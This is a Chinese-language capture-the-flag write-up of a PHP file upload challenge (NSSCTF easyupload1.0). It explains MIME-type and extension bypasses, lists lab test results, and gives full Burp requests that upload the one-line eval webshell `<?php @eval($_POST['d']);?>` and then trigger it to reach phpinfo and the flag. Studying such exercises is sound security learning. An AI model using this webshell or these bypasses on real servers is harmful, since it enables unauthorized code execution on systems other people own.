# 文件上传漏洞 · 做题笔记

> 关联实战：NSSCTF `[SWPUCTF 2021 新生赛]easyupload1.0`（题目标题 `up10ad来康康`）
> 环境指纹：`Apache/2.4.7 (Ubuntu)` + `PHP/5.5.9-1ubuntu4.14`
> 入口：`http://<host>:<port>/` → 表单 `action="upload.php"`，文件字段 `uploaded`，按钮 `submit=GoGoGo!`
> 记录时间：2026-10-23

---

## 0. 30 秒速查卡

```
看到上传框
  ↓
传 .php → 成功? ──是──→ 直接连 shell
  │否（提示"想啥呢！"）
  ↓
传 .jpg → 成功? ──是──→ 卡的是后缀/类型 → 抓包改 filename 为 .php，
  │                        Content-Type 保持 image/jpeg → 发送
  ↓
访问 /upload/xxx.php
  ├─ 空白 + 200  → 一句话木马执行成功 → POST 密码=phpinfo();
  ├─ 出现 phpinfo 大表 → Ctrl+F 搜 NSSCTF{
  ├─ 500         → 代码语法错，重传
  └─ 404         → 文件不在（环境重置/名字错）
  ↓
flag 一般在 phpinfo 的 Environment 表（容器环境变量 FLAG）
```

**本笔记的核心结论：这题只校验 `Content-Type`，完全不校验后缀。**

## 1. 判题：看到一个上传框，先问 4 个问题

| # | 问题 | 怎么测 | 结论 |
|---|---|---|---|
| 1 | 前端还是后端拦？ | 看页面源码有没有 `onchange`/`alert`；禁用 JS 再传 | 前端拦 → 禁用 JS 或改包即可 |
| 2 | 后缀黑名单还是白名单？ | 传 `.php` / `.jpg` 各一次 | `.php` 挂、`.jpg` 过 = 卡后缀 |
| 3 | 查不查 MIME？ | 抓包把 `Content-Type` 改 `image/jpeg` | 过了 = 只信客户端 MIME（**本题**） |
| 4 | 查不查文件头？ | 内容前加 `GIF89a` 再传 | 过了 = 用了 `getimagesize()` |

> 判断原则：**一次只改一个变量**，改完立刻看响应。

---

## 2. 八种绕过手段（按性价比排序）

| 顺序 | 手段 | 做法 | 适用/备注 |
|---|---|---|---|
| 1 | 直传 | 直接传 `.php` | 无任何校验时最省事 |
| 2 | **改 filename** | 传 `x.jpg`（MIME 白送），包里把 `filename` 改成 `x.php` | **本题解法**，只改一处 |
| 3 | **改 Content-Type** | `application/octet-stream` → `image/jpeg` | 只查 `$_FILES['type']` 时通杀 |
| 4 | 换后缀 | `.phtml` `.php5` `.pht` `.php3` `.php4` | 黑名单没写全；**本靶机实测这 4 个全都能执行** |
| 5 | 文件头伪造 | 开头加 `GIF89a` 再跟 `<?php ...` | 有 `getimagesize()` 时 |
| 6 | 大小写/特殊字符 | `.Php`、`.php.` 、`.php::$DATA` | **实测 `.Php` 在本靶机不执行**（Apache FilesMatch 区分大小写）；`::$DATA` 仅 Windows |
| 7 | `.htaccess` | 传 `.htaccess` 内容 `AddType application/x-httpd-php .jpg` | 需 Apache + AllowOverride。**本靶机用 `text/plain` 传 `.htaccess` 被拒**（未测 image/jpeg 版） |
| 8 | 解析漏洞 | `1.php.jpg`、`1.jpg/.php`、`1.jpg;.php` | 老版本 Apache/PHP |

### 本靶机实测结果（真实数据，可直接引用）

| 文件名 | Content-Type | 结果 |
|---|---|---|
| `shell.jpg` | `image/jpeg` | ✅ `./upload/shell.jpg succesfully uploaded!` |
| `shell.php` | `application/octet-stream` | ❌ `想啥呢！` |
| `shell.php` | `image/jpeg` | ✅ 成功 **且能执行** |
| `x.jpg` | `text/plain` | ❌ `想啥呢！` |
| `.htaccess` | `text/plain` | ❌ `想啥呢！` |
| `a.phtml` / `b.php5` / `c.pht` / `d.php3` | `image/jpeg` | ✅ 全部成功，**全部能执行** |
| `e.Php` | `image/jpeg` | 上传成功但**不执行**（直接吐源码） |

> 结论：判断只有 MIME 一道关；后端大概是
> `if (!in_array($_FILES['uploaded']['type'], ['image/jpeg','image/png','image/gif'])) die('想啥呢！');`
> `$_FILES['type']` 是 **HTTP 请求里客户端自己填的值**，服务端无法验证 → 这就是 MIME 绕过的本质。

## 3. 本次实战完整复盘

### 3.1 上传请求（Repeater 里可直接粘）

```http
POST /upload.php HTTP/1.1
Host: node7.anna.nssctf.cn:27667
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAAAABBBBCCCC
Content-Length: 298
Connection: close

------WebKitFormBoundaryAAAABBBBCCCC
Content-Disposition: form-data; name="uploaded"; filename="aaa.php"
Content-Type: image/jpeg

<?php @eval($_POST['d']);?>
------WebKitFormBoundaryAAAABBBBCCCC
Content-Disposition: form-data; name="submit"

GoGoGo!
------WebKitFormBoundaryAAAABBBBCCCC--
```

要点：
1. 请求里**有两个 `Content-Type`**：请求头那个 `multipart/form-data; boundary=...` **绝对不能动**；要改的是**文件段下面**那一行。
2. `Content-Length: 298` 是上面这份内容算好的；**改任何字符都要重算** → 勾上 Burp 的「更新 Content-Length」。
3. 最后一行必须以 `--` 结尾，结尾丢了会变成"什么都不传"。

成功响应（正文约 60 字节）：

```
<meta charset="utf-8">./upload/aaa.php succesfully uploaded!
```

### 3.2 执行命令请求

```http
POST /upload/aaa.php HTTP/1.1
Host: node7.anna.nssctf.cn:27667
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

d=phpinfo();
```

- `d` = 写进木马的密码（`<?php @eval($_POST['d']);?>` 里的 `d`）
- `d=phpinfo();` 是 **12 字节**（不是 15！）
- 成功时响应 ≈ **79 KB**，Ctrl+F 搜 `NSSCTF{`

### 3.3 flag 位置

```
Environment 表
FLAG    NSSCTF{34374017-1f39-42bb-806b-3e7e77f830f5}
```

⚠️ **该 flag 只对那一次的容器有效**。NSSCTF 容器回收/重建后端口变、flag 也变（本例中先后出现过 `27076`、`28683`、`27667` 三个端口，flag 各不相同）。

### 3.4 本靶机的固定提示语（用来判断处于哪一步）

| 提示语 | 含义 |
|---|---|
| `./upload/xxx succesfully uploaded!` | 上传成功（注意原文拼写少了 l） |
| `想啥呢！` | 后缀/MIME 没过 |
| `什么都不传就想白给f1ag??` | 文件没带上（字段名/boundary/Content-Length 坏了） |

## 4. Burp 操作规范（这题最关键的操作细节）

### 4.1 拦截 vs 放行

| 状态 | 浏览器表现 | 什么时候用 |
|---|---|---|
| **拦截关闭**（默认） | 正常上网 | **99% 的时间** |
| **拦截开启** | 每个请求都卡住，页面转圈 | 只在"要抓这一条"的几秒内 |

**三条铁律：**
1. 平时关，抓时开，抓到就转 Repeater，转完立刻关（门开着的总时长 < 10 秒）。
2. **先让页面加载完，再开拦截**（否则几十个 js/css 请求要你一个个点"转发"）。
3. **Repeater 的「发送」不受拦截开关影响** —— 抓到一次之后全在 Repeater 里干活。

**最省事的打法（推荐）**：
```
拦截一直关 → 正常上传一次 x.jpg（成功）
→ 代理 → HTTP历史记录 → 找到那条 POST /upload.php
→ 右键「发送到 Repeater」→ 改包 → 发送
```

### 4.2 拦截面板四个按钮

| 按钮 | 作用 | 何时用 |
|---|---|---|
| 转发 Forward | 原样放行 | 只是看一眼；或已复制到 Repeater |
| 丢弃 Drop | 请求不发给服务器 | 点错了、不想产生副作用 |
| 操作 Action | 子菜单：发送到 Repeater / **Do intercept → 拦截此请求的响应** | 需要看响应时 |
| 拦截已开启 | 总开关 | 抓完立刻关 |

### 4.3 让门"只拦我要的那条"

`目标 → 作用域` 添加 `node7.anna.nssctf.cn` → `代理设置 → 拦截客户端请求` 勾上「URL 在目标范围内」。
之后开拦截只有目标站点会被卡，其他请求自动放过。

### 4.4 其他要点

- **只改一处**原则：先传 `x.jpg`（浏览器自动发 `image/jpeg`），抓包**只改 `filename`** → 少一个变量少一个坑。
- 历史记录里找不到请求 → 先看顶部**过滤器**（可能"隐藏 CSS 和图片"）。
- 环境端口变了 → **`Host` 头必须同步改**，否则 404 或无法连接。

## 5. 响应判读表（照着查，别猜）

| 现象 | 真正含义 | 处理 |
|---|---|---|
| 响应区**完全空白**（无状态行） | **没点「发送」** | 点发送 / Ctrl+Enter |
| 一直转圈后超时 | `Content-Length` ≠ 实际 body 长度 | 改成实际字节数，或勾「更新 Content-Length」 |
| **无法连接 / Failed to connect** | TCP 都不通，目标不存在 | **容器被回收 → 回题目页重开环境** |
| `Connection reset` / `HTTP=000` | 请求太密被限速 | 停 5～10 秒再发 |
| `HTTP/1.1 404` | 路径/文件名错 | 打开 `/upload/` 目录列表核对 |
| `HTTP/1.1 200` + **0 字节** | 一句话木马**执行了但没输出** | 密码不对；或改传 `<?php phpinfo();?>` |
| `HTTP/1.1 500` + 空白 | 代码语法错，且 `display_errors=off` | 重传正确内容 |
| `HTTP/1.1 200` + **79 KB** | ✅ phpinfo 出来了 | Ctrl+F 搜 `NSSCTF{` |

> **空白页的两种可能，靠状态码区分：200 = 执行成功；500 = 写坏了。**

## 6. 拿到执行后，找 flag 的顺序

1. `phpinfo()` 的 **Environment** 表（容器题的 flag 90% 在环境变量 `FLAG`）
2. `env` / `printenv`
3. `ls /`、`/flag`、`/flag.txt`
4. 站点根目录、`/var/www/html`
5. 最后才 `find / -name "*flag*"`（慢，且经常是**诱饵**）

> 注意：题解里"蚁剑连上找到 flag 文件发现是假的"，就是踩了这个 —— 真 flag 在环境变量里，只有 `phpinfo()` / `env` 能看到。

## 7. 踩坑记录（真实教训）

| 坑 | 表现 | 教训 |
|---|---|---|
| `Content-Length` 写成 15（实际 12） | 点了发送一直转圈/没反应 | **永远勾「更新 Content-Length」**，别手数 |
| 忘了点「发送」 | 响应区全空 | Repeater 是手动的，没有状态行 = 没发 |
| 改了 `filename` 没改对 `Content-Type` | 仍然 `想啥呢！` | 两个 `Content-Type`，改**文件段**那个 |
| 把请求头的 `multipart/form-data; boundary=...` 改成 `image/jpeg` | 文件没上去 → `什么都不传就想白给f1ag??` | boundary 不能动 |
| 环境重建后还用旧端口 | `无法连接` | 端口和 `Host` 必须同步 |
| 容器过期 | 所有端口 TCP 不通 | **拿到 flag 立刻截图** |
| 连续狂发请求 | `HTTP=000`（连接被重置） | 不是 WAF，是**限速**，停 5～10 秒即可（我曾误判为"内容过滤"，实测 eval 型一句话可以正常上传执行） |
